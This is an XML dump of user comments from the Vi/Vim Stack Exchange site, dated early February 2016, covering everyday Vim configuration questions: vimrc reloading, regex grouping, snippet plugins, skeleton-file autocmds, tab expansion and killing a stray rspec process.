  <row Id="9908" PostId="6308" Score="3" Text="When you edit your *vimrc* you can execute it in your running vim, using the command `:source /path/to/vimrc`. But this is not as clean as starting a fresh instance of Vim (because it won't reset any default settings you might have changed on the command line). So I find the cleanest way to test is to have two copies of Vim running, one where I edit my *vimrc* and another which I **restart** to test the results." CreationDate="2016-02-01T06:18:02.043" UserId="630" />
  <row Id="9909" PostId="6312" Score="0" Text="&quot;After reading some websites […]&quot; Why don't you read Vim's built-in documentation instead?" CreationDate="2016-02-01T06:52:08.770" UserId="54" />
  <row Id="9910" PostId="6312" Score="0" Text="I've read that too, up to a point.  But it is at times not the most readable, so I try to check out many sources." CreationDate="2016-02-01T07:02:30.277" UserId="6225" />
  <row Id="9911" PostId="6310" Score="0" Text="I'm curious, can you not (at least partly) solve this by letting SuperTab use omnicomplete as the first complete function, then complete snippets as the second alternative? I've not used SuperTab in so long I don't remember the correct options..." CreationDate="2016-02-01T07:28:35.493" UserId="21" />
  <row Id="9912" PostId="6305" Score="1" Text="Note that the include order may matter. For example, in LaTeX, `hyperref` should be loaded before `cleveref` if both are used." CreationDate="2016-02-01T08:09:28.933" UserId="205" />
  <row Id="9913" PostId="6309" Score="0" Text="Nice idea! Take a look at the other example I added. It would be a nuisance to update my scripts whenever I edit the text in files I use: C files, Makefiles, LaTeX, etc. I am in search for something a bit different. A general script and a keybinding, such that whenever I am in a line with a vim command, it would run this command." CreationDate="2016-02-01T10:30:14.867" UserId="5919" />
  <row Id="9914" PostId="6309" Score="0" Text="You should learn how to make these macros and functions yourself, then you can just create one on the fly whenever you need it." CreationDate="2016-02-01T10:50:34.167" UserId="4932" />
  <row Id="9915" PostId="6309" Score="0" Text="What do you mean by &quot;whenever I am in a line with a vim command, it would run this command. &quot;?" CreationDate="2016-02-01T10:50:56.317" UserId="4932" />
  <row Id="9916" PostId="6313" Score="0" Text="&quot;Fix spacing&quot; means nothing. Or everything. It all depends on what rules you want to apply and how bad the situation is." CreationDate="2016-02-01T10:52:26.747" UserId="54" />
  <row Id="9917" PostId="6313" Score="0" Text="Your question is far too vague to be meaningful. What exactly do you mean with &quot;fix only spacing&quot;? And what sort of changes do you want to &quot;minimize&quot;? You should edit your question and include some examples of badly formatted code and how you would like it to look." CreationDate="2016-02-01T11:02:14.640" UserId="51" />
  <row Id="9918" PostId="6314" Score="1" Text="If I understand your question correctly, you would like to stop the `rspec` process from within Vim. Am I correct?" CreationDate="2016-02-01T11:04:58.140" UserId="51" />
  <row Id="9919" PostId="6290" Score="1" Text="@ablewasiereisawelba `where I can just use the one-line custom command each time I need to do this` -- note that you doesn't have to re-create the macro every time you need to use it, as it is possible to store it as a function/command on your vimrc." CreationDate="2016-02-01T11:20:29.187" UserId="1405" />
  <row Id="9920" PostId="6314" Score="0" Text="thanks @Carpetsmoker. My rspec test are run in the iTerm window it is a separate one from Macvim. I would like to stop rspec or any process that happen in the iTerm window. Maybe I can run a `kill 'rspec_process' &amp;&amp; clear &amp;&amp; rspec {spec}`" CreationDate="2016-02-01T11:26:48.530" UserId="3357" />
  <row Id="9922" PostId="6316" Score="0" Text="At least &quot;space after ,;&quot; will break that when used as punctuation in strings and comments, no? Also, using a space after a comma is typically considered to aid in readability, but I guess that's a personal opinion... ;-) Other regexes may have similar unwanted side-effects, so be sure to check the result..." CreationDate="2016-02-01T12:12:14.917" UserId="51" />
  <row Id="9923" PostId="6309" Score="1" Text="Suppose your cursor is on a line x, then, hitting (say) `zp` would search for a vi command on that line, and execute it. This command could be marked by a designated prefix, e.g., `VIM: !} sort -u`." CreationDate="2016-02-01T12:19:16.297" UserId="5919" />
  <row Id="9924" PostId="6316" Score="0" Text="You are right. Need to check the results.  At least this function makes ugly code readable.&#xA;Who knows, how to avoid substitution within strings?" CreationDate="2016-02-01T12:20:33.497" UserId="6229" />
  <row Id="9925" PostId="6316" Score="0" Text="Using regexes for these sort of complicates fixes on a large codebase are, IMHO, the wrong tool for the job. It's okay for a simple fix, but you're probably better off using a &quot;real&quot; C/C++ parser which can fix it according to a set of rules. A [number of those tools are listed here](http://stackoverflow.com/q/841075/660921)." CreationDate="2016-02-01T12:24:42.643" UserId="51" />
  <row Id="9926" PostId="6316" Score="0" Text="Thank you.&#xA;Real parses (I tested indent and astyle) reworks the code totally. &#xA;My goal to fix ugly style with minimal changes and commit it.&#xA;I want to preserve braces (Almann or K&amp;R) inside functions." CreationDate="2016-02-01T12:37:04.580" UserId="6229" />
  <row Id="9927" PostId="6316" Score="0" Text="Pretty sure you can configure those tools to use whatever brace style you prefer." CreationDate="2016-02-01T12:39:24.943" UserId="51" />
  <row Id="9928" PostId="6315" Score="1" Text="What is `expand`?" CreationDate="2016-02-01T12:47:54.760" UserId="205" />
  <row Id="9929" PostId="6316" Score="0" Text="Sure I can choose any style, but didn't find option to don't touch style." CreationDate="2016-02-01T12:52:10.433" UserId="6229" />
  <row Id="9932" PostId="6315" Score="0" Text="Expand is an inbuilt terminal command to copy tab character to spaces. Please find a detailed discription in the following link. http://www.computerhope.com/unix/uexpand.htm" CreationDate="2016-02-01T13:48:32.243" UserId="3007" />
  <row Id="9933" PostId="6315" Score="1" Text="If these are external commands, you should mention that." CreationDate="2016-02-01T13:49:10.380" UserId="205" />
  <row Id="9934" PostId="6315" Score="0" Text="Further description added. Please review" CreationDate="2016-02-01T13:52:09.033" UserId="3007" />
  <row Id="9935" PostId="6314" Score="1" Text="You can probably use `pkill` or `killall` to kill it: e.g. `:!pkill rspec`. This will kill all rspec processes, but this is probably not an issue. This should also close the terminal window, as the process running inside of it is now finished. You can then restart it by using `:call RunAllSpecs()` (or one of the other functions) again." CreationDate="2016-02-01T14:18:31.680" UserId="51" />
  <row Id="9936" PostId="6314" Score="0" Text="Thanks a lot Carpetsmoker. I found an answer and will publish what ?I've found" CreationDate="2016-02-01T14:41:58.623" UserId="3357" />
  <row Id="9937" PostId="6314" Score="0" Text="It's nearly work. I've try something like `let g:rspec_command = &quot;pkill -f rerun &amp;&amp; clear &amp;&amp; rerun bin/rspec spec/services/user_management_service_spec.rb&quot;` But the command is send to the terminal. If I do `:!pkill -f rerun` it kill properly the process without killing the window." CreationDate="2016-02-01T14:47:44.873" UserId="3357" />
  <row Id="9938" PostId="6314" Score="1" Text="I moved this issue to the github issue of vim-rspec I will post the full answer when I will get it : https://github.com/thoughtbot/vim-rspec/issues/110" CreationDate="2016-02-01T15:00:08.697" UserId="3357" />
  <row Id="9939" PostId="6286" Score="0" Text="Maybe this post can help you : http://vi.stackexchange.com/questions/6283/why-doesnt-vim-recognize-html-inside-php?rq=1" CreationDate="2016-02-01T16:20:23.250" UserId="6232" />
  <row Id="9940" PostId="6304" Score="0" Text="Is this just for curiosity? Are you intending to apply it to some task? [(XY Problem)](http://meta.stackexchange.com/a/66378/188334)" CreationDate="2016-02-01T16:33:05.737" UserId="1405" />
  <row Id="9941" PostId="6309" Score="0" Text="Is this an answer?" CreationDate="2016-02-01T16:52:42.990" UserId="5919" />
  <row Id="9942" PostId="6304" Score="0" Text="@mMontu Both. I was going to try writing a program that creates a hidden process of vim and then sends keystrokes to it. Just as a hobby project to see if I can. I was going to end up looking in the source code, but I thought I could also ask here." CreationDate="2016-02-01T16:53:37.083" UserId="2920" />
  <row Id="9943" PostId="6304" Score="0" Text="Well, that is not usual. Are you sure that vim is the right tool for your automation? Because vim is an *interactive* editor it will use resources in order to provide an user interface that is likely to only trouble your program. For some specific cases you can pass a command with `-c` in order to have vim filtering a file." CreationDate="2016-02-01T17:00:23.390" UserId="1405" />
  <row Id="9944" PostId="6286" Score="0" Text="That was my previous question, this one is a continuation of that ;^)" CreationDate="2016-02-01T18:21:32.077" UserId="6189" />
  <row Id="9945" PostId="6315" Score="1" Text="You could also just do `:%!expand -t 4` inside of vim.  Better yet, you could also use the current shift width option:  `:exe '%!expand -t ' . &amp;shiftwidth`" CreationDate="2016-02-01T21:29:26.227" UserId="865" />
  <row Id="9946" PostId="6309" Score="1" Text="http://stackoverflow.com/questions/4268532/vim-how-to-execute-selected-text-as-vim-commands" CreationDate="2016-02-01T21:45:26.293" UserId="4932" />
  <row Id="9947" PostId="6313" Score="0" Text="Sounds like you want to do something very similar to this video:&#xA;&#xA;https://vimeo.com/15443936&#xA;&#xA;You're massaging one text input into a similar text output, and want to be able to do this repeatedly for different files. Start with a bunch of global search/replace commands, use the `:history` command to save these commands into a function, run the function over other files." CreationDate="2016-02-01T23:08:45.607" UserId="4932" />
  <row Id="9949" PostId="6304" Score="0" Text="@mMontu It's not for an automation. More of an experiment. And yeah, I'm sure I want to use vim for it. Thanks for your help!" CreationDate="2016-02-02T00:12:48.433" UserId="2920" />
  <row Id="9950" PostId="6321" Score="0" Text="How do you enter a `&lt;c-}&gt;` using your keyboard?" CreationDate="2016-02-02T02:18:20.637" UserId="205" />
  <row Id="9951" PostId="6321" Score="1" Text="@muru, oh.. I got your point. I'm so stupid. Thank you very much. I need to press shift to get `}` hit." CreationDate="2016-02-02T02:23:26.563" UserId="1276" />
  <row Id="9952" PostId="6321" Score="0" Text="Even then it might not work. See http://vi.stackexchange.com/q/4290/205" CreationDate="2016-02-02T02:23:56.153" UserId="205" />
  <row Id="9953" PostId="6321" Score="0" Text="@muru, no, it doesn't work!! so it's impossible to map &lt;c-}&gt; then??" CreationDate="2016-02-02T02:25:10.173" UserId="1276" />
  <row Id="9954" PostId="6321" Score="0" Text="I'd say so. Stick to `&lt;c-]&gt;`." CreationDate="2016-02-02T02:25:38.533" UserId="205" />
  <row Id="9955" PostId="6310" Score="0" Text="I'm not sure. From the Supertab documentation I can't tell how one would indicate complete snippets as an alternative. Supertab does seem to have some built-in support for snipmate, however. The default behavior gives the snippets priority in all situations. So to implement your suggestion I would need to know both how to tell Supertab to explicitly try to complete a snippet as well as how to tell it to not try to complete snippets by default. I'm not sure how to do either of these things!" CreationDate="2016-02-02T02:34:42.170" UserId="5464" />
  <row Id="9956" PostId="6320" Score="0" Text="`:sort!` would be *sorted* reversed order, I think OP just wants reversed order, as in the `reverse()` code you have shown." CreationDate="2016-02-02T03:50:43.267" UserId="205" />
  <row Id="9957" PostId="6320" Score="0" Text="There is an issue with an empty line (file terminated with \n) at BOF. (Resolved by deleting or ignoring it.) Otherwise, this works a treat! Thanks!" CreationDate="2016-02-02T06:36:46.593" UserId="6216" />
  <row Id="9958" PostId="6325" Score="0" Text="Oh wow I cannot believe I forgot to test what Esc does! Thanks! I used ctrl+c a lot in the past but it never occurred to me to try this." CreationDate="2016-02-02T06:46:29.880" UserId="390" />
  <row Id="9959" PostId="6325" Score="0" Text="As I fix this I find no less than 4 other examples in my vimrc of cnoremap's to &lt;c-c&gt;. This means that I knew about this aspect of Vim in the past. I knew it well. And then I completely forgot about it. Face, meet palm" CreationDate="2016-02-02T07:00:52.173" UserId="390" />
  <row Id="9960" PostId="6327" Score="3" Text="Start with the basics: disable your vimrc (`vim -Nu NONE`), if that works, try bisecting your plugins, etc." CreationDate="2016-02-02T07:53:37.460" UserId="205" />
  <row Id="9961" PostId="6327" Score="1" Text="@muru: unfortunately it doesn't seem to repro until being open for several hours at least -- some rare event must be triggering it, but I haven't narrowed it down. so it may take a month to bisect ;-)" CreationDate="2016-02-02T07:59:30.713" UserId="2560" />
  <row Id="9962" PostId="6327" Score="1" Text="What if you save the session, and restart the session? Tried different versions?" CreationDate="2016-02-02T08:00:20.673" UserId="205" />
  <row Id="9963" PostId="6327" Score="0" Text="I didn't know you could save the session -- I'll give that a try next time and see what happens. I've just been quitting and starting over.&#xA;&#xA;BTW, I edited to include my .vimrc: http://pastebin.com/z33b33E2" CreationDate="2016-02-02T08:04:06.457" UserId="2560" />
  <row Id="9964" PostId="6327" Score="3" Text="what does `omap l`show?" CreationDate="2016-02-02T10:27:58.697" UserId="71" />
  <row Id="9965" PostId="6331" Score="0" Text="Can you provide some examples on what are you trying to do, i.e., a sample text and the expected matches for your (intended) regex? [(XY Problem)](http://meta.stackexchange.com/a/66378/188334)" CreationDate="2016-02-02T12:04:38.177" UserId="1405" />
  <row Id="9966" PostId="6332" Score="0" Text="The file is not actually proper XML format, but it's actually not well documented [`ini` file](https://github.com/EA31337/FX-MT-VM/blob/master/conf/ea.ini) having those 3 XML-like tags." CreationDate="2016-02-02T12:17:01.967" UserId="467" />
  <row Id="9967" PostId="6331" Score="0" Text="@mMontu ok. amm. for example, I want to search lines with following criteria,&#xA;USB &amp; LENGTH should definitly be there along with either RX or TX." CreationDate="2016-02-02T12:17:37.027" UserId="6247" />
  <row Id="9968" PostId="6328" Score="0" Text="QQ: What's the purpose of `keeppatterns`?" CreationDate="2016-02-02T12:27:35.777" UserId="467" />
  <row Id="9969" PostId="6334" Score="1" Text="Thanks for the suggestion, it's fine, but it won't help in this particular case, since I'm looking for non-interactive solution as part of `ex` script where I can specify which file to insert depending on the user input arguments." CreationDate="2016-02-02T12:35:04.597" UserId="467" />
  <row Id="9971" PostId="5393" Score="0" Text="neovim didn't install it, vim-plug did. Where you told it to!" CreationDate="2016-02-02T12:31:31.760" UserId="6249" />
  <row Id="9974" PostId="6335" Score="0" Text="the last one, can you pls rewrite without using \v ? to correlate." CreationDate="2016-02-02T14:11:55.230" UserId="6247" />
  <row Id="9976" PostId="6331" Score="4" Text="`()` have to be escaped in Vim's regex to be used for grouping, `:help /\(`.  An unescaped `(` or `)` matches the literal character." CreationDate="2016-02-02T14:51:06.517" UserId="15" />
  <row Id="9983" PostId="6335" Score="2" Text="`\(.*USB\&amp;.*LEN\).*\(RX\|TX\)` -- you can find the details in `:help \v`" CreationDate="2016-02-02T15:16:08.190" UserId="1405" />
  <row Id="9984" PostId="6335" Score="0" Text="thanks a lot :)" CreationDate="2016-02-02T15:33:07.147" UserId="6247" />
  <row Id="9985" PostId="6331" Score="0" Text="@jamessan thanks for the explanation :)" CreationDate="2016-02-02T15:36:19.963" UserId="6247" />
  <row Id="9986" PostId="6299" Score="1" Text="Very nice one-line command. Thank you, djjcast." CreationDate="2016-02-02T17:37:20.973" UserId="6195" />
  <row Id="9987" PostId="6290" Score="0" Text="Okay, I see that now. You said, &quot;Depending on your needs you could enhance it, e.g.: pass an argument to the command and function so it would work for any number of lines instead of being fixed in groups of 4 lines.&quot; I already put @saginaw's &quot;ReverseEveryNLines(n)&quot; function into my &quot;_vimrc&quot; file, which does what you say - allows me to do the reversing for any number of lines. But I also went ahead and put your &quot;Reverse4&quot; function in my &quot;_vimrc&quot; file, since I only foresee ever needing to do this for exactly four lines. Thank you for adding the &quot;Edit&quot; part to your previous solution, mMontu." CreationDate="2016-02-02T18:02:04.383" UserId="6195" />
  <row Id="9988" PostId="6290" Score="0" Text="Oh, and also (apologies for any verbosity of mine), your (mMontu's) function works even when there is not an exact multiple of 4 lines in the file, which is certainly nice. However, for my purposes, I would actually like to know when there is not an exact multiple of 4 lines, because that means that something is wrong - and then I can go and figure out what's wrong and make it right before proceeding. Thus, oddly enough, for my purposes, I prefer to have it NOT work in those cases, in order to alert me of the situation. However, it's pretty rare that that happens, so I don't really need that." CreationDate="2016-02-02T18:08:27.153" UserId="6195" />
  <row Id="9989" PostId="6340" Score="1" Text="You can try using `Ctrl-V` in insert mode to find out what your keys are generating in Vi. See `:h i_Ctrl-V`." CreationDate="2016-02-02T21:03:01.907" UserId="1453" />
  <row Id="9990" PostId="6340" Score="0" Text="Since the '^' is on the same button as the '[' , even if I hit 'Ctrl + shift + ^' or 'Ctrl + ^', I get 'Ctrl + [' (I copied the two combination on a buffer and I got '^[' for both of them)" CreationDate="2016-02-02T22:02:14.170" UserId="5081" />
  <row Id="9991" PostId="6341" Score="1" Text="Afaik there is no mapping that sorts given lines.  _(at least `:helpgrep sort` didn't turn up anything in the change.txt file)_" CreationDate="2016-02-02T23:12:14.653" UserId="865" />
  <row Id="9994" PostId="6327" Score="0" Text="@ChristianBrabandt: &quot;No mapping found&quot;. It isn't just `l` in particular so I doubt any one key is mapped incorrectly. Seems more like there's a setting that gets flipped or something." CreationDate="2016-02-02T23:17:08.600" UserId="2560" />
  <row Id="9996" PostId="6224" Score="0" Text="@VanLaser That's right I am beginner with vim. How would you organize appearance? What do you think would be more useful to display than for example NerdTree?" CreationDate="2016-02-02T23:40:11.270" UserId="2993" />
  <row Id="9998" PostId="6294" Score="0" Text="`:help python-dynamic` says `...To use the Python interface the Python DLL must be in your search path.  In a&#xA;console window type &quot;path&quot; to see what directories are used.`" CreationDate="2016-02-03T11:13:54.973" UserId="1145" />
  <row Id="9999" PostId="6294" Score="0" Text="It's there. `:!where python27.dll` returns `C:\Windows\System32\python27.dll`. Also note that if the library is missing, a different error occurs: `E370: Could not load library python27.dll` and `E263: Sorry, this command is disabled, the Python library could not be loaded.`" CreationDate="2016-02-03T13:41:23.333" UserId="2010" />
  <row Id="10000" PostId="6294" Score="0" Text="Ahh. I see. `:py3` works but `:py` won't? It's possible if one of plugin execute `:py3` during vim launch. See `:he python-2-and-3` for explain how python/dyn and python3/dyn works together.." CreationDate="2016-02-03T13:52:46.233" UserId="1145" />
  <row Id="10001" PostId="6336" Score="1" Text="Thank you, works great! `guioptions-=L` seems to be enough for me, I might not have covered all cases though. For anyone wondering `:set guioptions-=r` removes the right hand side scrollbar and `guioptions-=L` removes the left one, which appears when using `:vsplit`." CreationDate="2016-02-03T14:33:06.437" UserId="6246" />
  <row Id="10002" PostId="6346" Score="1" Text="Thank you for the answer but it didn't work. (E447: Can't find file &quot;test.txt&quot; in path) Here is my screencast: https://asciinema.org/a/30cc7yp6hhv4m38hh7qi6uem4" CreationDate="2016-02-03T14:33:17.413" UserId="6261" />
  <row Id="10003" PostId="6347" Score="1" Text="It works too but I wanted to be able to do it in normal mode." CreationDate="2016-02-03T15:07:46.517" UserId="5081" />
  <row Id="10004" PostId="6346" Score="0" Text="@npcode hmm weird. Those exact steps seem to work fine for me. But maybe because I'm on OS X, Vim seems to work fine when the case doesn't match. I'll try it on Linux." CreationDate="2016-02-03T15:19:48.533" UserId="246" />
  <row Id="10005" PostId="6294" Score="0" Text="Looks like swapping out 2.7.11 for 2.7.9 did the trick. Strange though." CreationDate="2016-02-03T15:35:16.523" UserId="2010" />
  <row Id="10006" PostId="6348" Score="3" Text="For 2.7.11 this is caused by python bug, that can be [worked around](https://github.com/vim/vim/blob/master/appveyor.yml#L8-L9)" CreationDate="2016-02-03T16:38:48.877" UserId="71" />
  <row Id="10007" PostId="6349" Score="0" Text="These are not environments, by the way, but commands. [There's a difference](http://tex.stackexchange.com/q/8373/77871)." CreationDate="2016-02-03T17:55:48.493" UserId="205" />
  <row Id="10008" PostId="6345" Score="0" Text="I think `fileignorecase` doesn't work because it only affects vim internal behavior and when it tries to open a file, the OS decides and plays by own rules. You can try to define the ['includeexpr'](http://vimdoc.sourceforge.net/htmldoc/options.html#'includeexpr') or redefine the default with `:map gf` and write an expression of function which will try all the combinations (like Test.txt, tEst.txt, teSt.txt, tesT.txt, TEst.txt and so on), but I am not sure if it worth the effort trying to do so." CreationDate="2016-02-03T18:02:27.577" UserId="6013" />
  <row Id="10009" PostId="5123" Score="2" Text="Did you see [these tips](http://vim.wikia.com/wiki/Fix_arrow_keys_that_display_A_B_C_D_on_remote_shell)? Maybe something of them can be useful." CreationDate="2016-02-03T18:09:08.087" UserId="6013" />
  <row Id="10010" PostId="6349" Score="1" Text="@muru thank you, I stand corrected." CreationDate="2016-02-03T20:00:58.890" UserId="6272" />
  <row Id="10012" PostId="789" Score="0" Text="This question &amp; answer is what first inspired me to look into `ex` and really learn it.  Thank you.  Some further reading on this subject (full disclosure: I wrote these ;) is: [reversing every four lines with `ex`](http://vi.stackexchange.com/a/6289/4676), and [using the `-c` option](http://vi.stackexchange.com/a/6247/4676).  You might add them to your link list at the bottom, if you want.  :)" CreationDate="2016-02-03T20:03:17.173" UserId="4676" />
  <row Id="10013" PostId="6348" Score="0" Text="Oh cool, thanks!" CreationDate="2016-02-03T20:20:51.097" UserId="2010" />
  <row Id="10014" PostId="6224" Score="2" Text="I would organize appearance later, and just use `:e &lt;tab&gt;` and `:b &lt;tab&gt;` for a while." CreationDate="2016-02-03T22:40:52.240" UserId="1800" />
  <row Id="10015" PostId="6351" Score="4" Text="You can also manually break apart a single undo-block with the command `CTRL-G u` in insert mode, which is useful if you have some insert mode macros." CreationDate="2016-02-04T00:06:57.637" UserId="4932" />
  <row Id="10016" PostId="6346" Score="0" Text="@npcode yes I see the problem on Linux. It seems that Vim won't open the file if the case does not match since most file systems on Linux are case sensitive. Maybe you could modify this somehow with `:help includeexpr'`. Or maybe post on the vim-dev mailing list to see what they say." CreationDate="2016-02-04T00:25:43.007" UserId="246" />
  <row Id="10017" PostId="6358" Score="1" Text="Did you try out editing a new C++ file after adding this `autocmd`, and creating the skeleton file?" CreationDate="2016-02-04T01:00:21.817" UserId="205" />
  <row Id="10018" PostId="6358" Score="1" Text="I tried creating a new file with a .cpp file extension and editing it with Vim.  Upon opening it for editing, it was still blank is there another step I need to do?" CreationDate="2016-02-04T01:12:34.693" UserId="6280" />
  <row Id="10019" PostId="6358" Score="2" Text="No, you should have seen the contents of the skeleton file already included. What if you manually run `:r  C:\(full file path of skeleton text file)`? Do you get any errors?" CreationDate="2016-02-04T01:14:30.260" UserId="205" />
  <row Id="10020" PostId="6358" Score="0" Text="Just go clarify, did you create a .cpp file, then edit it in vim, or did you do an action such as `:e newfile.cpp`?" CreationDate="2016-02-04T01:20:53.350" UserId="4932" />
  <row Id="10021" PostId="6358" Score="0" Text="@fruglemonkey I used :enew then :sav filename.cpp.  Not sure if this is the best way to create a new file, I will try :e newfile.cpp as well." CreationDate="2016-02-04T01:25:16.773" UserId="6280" />
  <row Id="10022" PostId="6358" Score="0" Text="@muru, manually running the command you mentioned does the trick, I'm not sure why that's not working from my vimrc.  Thanks for your help on this." CreationDate="2016-02-04T01:27:24.043" UserId="6280" />
  <row Id="10023" PostId="6358" Score="3" Text="@electriccello Ah, `:enew` won't work, but `:e newfile.cpp` should work if `newfile.cpp` didn't already exist (even if empty)." CreationDate="2016-02-04T01:28:52.250" UserId="205" />
  <row Id="10024" PostId="6358" Score="0" Text="Bingo that did it! Thanks so much for the solution I spent way too much time trying to figure that out on my own!" CreationDate="2016-02-04T01:35:13.787" UserId="6280" />
  <row Id="10025" PostId="6358" Score="0" Text="What did it? You can post what worked as an answer." CreationDate="2016-02-04T01:36:22.627" UserId="205" />
  <row Id="10026" PostId="6358" Score="4" Text="The reason `:enew` wont work is because you're editing a new, unnamed buffer, and *then* saving it as a .cpp file. `BufNewFile` only triggers if you're editing a new file with the target filename." CreationDate="2016-02-04T01:40:49.403" UserId="4932" />
  <row Id="10027" PostId="6352" Score="0" Text="Thanks, I will check it out and let you know how it worked out." CreationDate="2016-02-04T02:30:43.843" UserId="6272" />
  <row Id="10028" PostId="6358" Score="1" Text="That makes sense, I just didn't know the difference between :enew and :e filename." CreationDate="2016-02-04T02:41:56.020" UserId="6280" />
  <row Id="10029" PostId="6352" Score="2" Text="I just want to mention that the current support for commands is only very simple. This is because it is really quite hard to parse LaTeX/TeX commands, i.e., how can I know the number of arguments to a specific command? (Answer: I can't, if I don't know the command definition.) Thus `csc` only works if the cursor is on the actual command or the first argument." CreationDate="2016-02-04T06:50:31.387" UserId="21" />
  <row Id="10031" PostId="6364" Score="1" Text="I don't think it is possible, but maybe you are missing other ways of solving your problem. Can you provide more context, explain what would be the benefit of restricting the snippets to a set of files?" CreationDate="2016-02-04T12:28:05.827" UserId="1405" />
  <row Id="10032" PostId="6364" Score="0" Text="@mMontu, done --- thanks for the hint." CreationDate="2016-02-04T12:36:29.493" UserId="854" />
  <row Id="10033" PostId="6364" Score="2" Text="Perhaps using anonymous snippets might solve the issue: https://github.com/SirVer/ultisnips/blob/master/doc/UltiSnips.txt#L446 and define them on an autocmd event that triggers only for your filename." CreationDate="2016-02-04T12:48:13.533" UserId="1800" />
  <row Id="10034" PostId="6364" Score="0" Text="@VanLaser yes, possible, but writing the anonymous snippet is less straightforward, and then I should add the autocmd to the .vimrc for every file... and if I change the name? Or copy it to another? I really hoped in something that could be almost transparent, as adding the directory containing the file to the ultisnips search paths..." CreationDate="2016-02-04T14:12:24.643" UserId="854" />
  <row Id="10035" PostId="6346" Score="4" Text="Conceptually, I don't think this is possible.&#xA;&#xA;Consider:  if you type `gf` while pointing to `file.txt` and the folder contains `File.txt` and `file.TXT`, which should it open?" CreationDate="2016-02-04T14:41:10.650" UserId="6294" />
  <row Id="10036" PostId="6364" Score="1" Text="You can use a different file that contains the anonymous snippets and `source` it in your vimrc. The &quot;per-file&quot; autocmd events could be in vimrc or in that file. Otherwise, feel free to add that functionality ;)" CreationDate="2016-02-04T15:21:48.377" UserId="1800" />
  <row Id="10037" PostId="6364" Score="0" Text="@VanLaser ;-) my vim programming is, well... quite low. But if I have time I will look at it; for the time being I have not been able to find where `g:UltiSnipsSnippetDirectories` is used in the sources (`grep  g:UltiSnipsSnippetDirectories **/*` gives just the place where it is defined or supplied as default...)" CreationDate="2016-02-04T16:12:24.030" UserId="854" />
  <row Id="10038" PostId="6365" Score="0" Text="Thanks and +1, but I really look forward to something I can really add just to the file in question. Something like a modeline `:ReadSnippeAlsoFrom(./extra.snippets)` or somethign similar. I will see if I can dig into it..." CreationDate="2016-02-04T16:15:27.417" UserId="854" />
  <row Id="10039" PostId="6365" Score="0" Text="You can adapt my code to have a function that defines the `DedicatedSnippets` group for the list of files you pass to `:ReadSnippeAlsoFrom`. BTW, instead of `/path/to/your/file`, you can simply pass a dirname, and have the two functions compare the current file/buffername to the list of files." CreationDate="2016-02-04T16:59:49.523" UserId="626" />
  <row Id="10040" PostId="6365" Score="1" Text="Note (bis): if you prefer having only a single function/command that you call on the current buffer, you can define the autocommand with `&lt;buffer&gt;` (instead of a filename), and don't forget, that calling the `ReadSnippeAlsoFrom` function should also call `s:AddSnippets`)" CreationDate="2016-02-04T17:01:36.613" UserId="626" />
  <row Id="10041" PostId="6371" Score="0" Text="This works wonderfully, thank you very much!" CreationDate="2016-02-04T22:39:34.747" UserId="6300" />
  <row Id="10042" PostId="6373" Score="0" Text="I read [this](http://learnvimscriptthehardway.stevelosh.com/chapters/26.html) which said, that `'` is the only character that has a special meaning in literal strings, which lead to my own confusion, thank you very much!" CreationDate="2016-02-04T22:42:49.870" UserId="6300" />
  <row Id="10043" PostId="6369" Score="0" Text="Is it part of vim, or an add-on ?&#xA;I am using vim7.4 and help didnt return anything.&#xA;&#xA;this is the page of logipat,  &#xA;http://vim.sourceforge.net/scripts/script.php?script_id=1290" CreationDate="2016-02-05T04:58:22.447" UserId="6247" />
  <row Id="10044" PostId="6366" Score="2" Text="So if I understand you correctly you want something like `Hello%$` for DOS files (where `%` is a CR and `$` is a `LF`)? This isn't possible with the `list`/`listchars` setting, and I can't really come up with a way to do this in VimScript either..." CreationDate="2016-02-05T06:51:43.090" UserId="51" />
  <row Id="10045" PostId="6369" Score="0" Text="it's bundled with newer Vims, starting from something like 7.4.700 or so." CreationDate="2016-02-05T09:11:38.220" UserId="71" />
  <row Id="10046" PostId="85" Score="1" Text="Write a plugin." CreationDate="2016-02-05T11:07:28.890" UserId="343" />
  <row Id="10047" PostId="85" Score="1" Text="@Rich I have :)" CreationDate="2016-02-05T11:08:00.157" UserId="91" />
  <row Id="10048" PostId="85" Score="1" Text="@AndrewFerrier In that case I think you might be underselling yourself by describing your understanding as &quot;hazy&quot; :). Other things that have helped me: 1. Learn Vimscript the Hard Way (tick!) and 2. Answering questions on this site (with all the poring through the `:help` that that entails)." CreationDate="2016-02-05T11:12:19.413" UserId="343" />
  <row Id="10049" PostId="6368" Score="1" Text="The [other answer](http://stackoverflow.com/a/29688194/5358968) in the link taught me `:bro[wse] ol[dfiles][!]`" CreationDate="2016-02-05T14:03:20.590" UserId="4655" />
  <row Id="10050" PostId="6366" Score="1" Text="@Carpetsmoker That's correct. Apart from `set list` is there a way to have `CR` and `LF` show as specific characters maybe?" CreationDate="2016-02-05T14:59:33.037" UserId="4833" />
  <row Id="10051" PostId="6374" Score="2" Text="Suspect it won't be much help for Unite's async stuff, but, more generally, are you already aware of `:h debug-scripts`? It describes how to step through Vimscript command by command, and, if necessary, run ex commands as you go." CreationDate="2016-02-05T16:15:15.730" UserId="343" />
  <row Id="10052" PostId="6375" Score="0" Text="Have you already read `:h netrw-ssh-hack`?" CreationDate="2016-02-05T16:20:25.250" UserId="343" />
  <row Id="10053" PostId="6375" Score="1" Text="@Rich I have not -- actually, when I try to use `:help` at all in MobaXTerm vim, I get `E433: No tags file` :/" CreationDate="2016-02-05T17:26:49.513" UserId="4890" />
  <row Id="10054" PostId="6375" Score="0" Text="Ah. Here you go, then: https://vimhelp.appspot.com/pi_netrw.txt.html#netrw-ssh-hack I'd suggest trying to get it working *with* a password first, and then having a go at that. I guess check `scp` works in MobaXTerm outside of Vim, too." CreationDate="2016-02-05T17:49:14.727" UserId="343" />
  <row Id="10055" PostId="6375" Score="0" Text="@Rich Thanks for the link! I'll see what I can figure out. I also need to figure out why there isn't any `/usr/share/vim/doc` folder (where the help file would live). I should add: `scp` works fine from the MobaXTerm terminal." CreationDate="2016-02-05T17:52:34.527" UserId="4890" />
  <row Id="10056" PostId="6377" Score="3" Text="Your vimrc file contains Ex commands (commands that you type on the command line and which begin with a colon). The Ex command `:source $MYVIMRC` sources all the Ex commands written in your vimrc. However, if you add a bang `:source! $MYVIMRC`, it doesn't read Ex commands anymore but Vim commands (executed from normal mode, like `dd` for example). So when you type `:source! $MYVIMRC`, Vim probably searches for anything which looks like a normal command." CreationDate="2016-02-05T19:05:33.387" UserId="4939" />
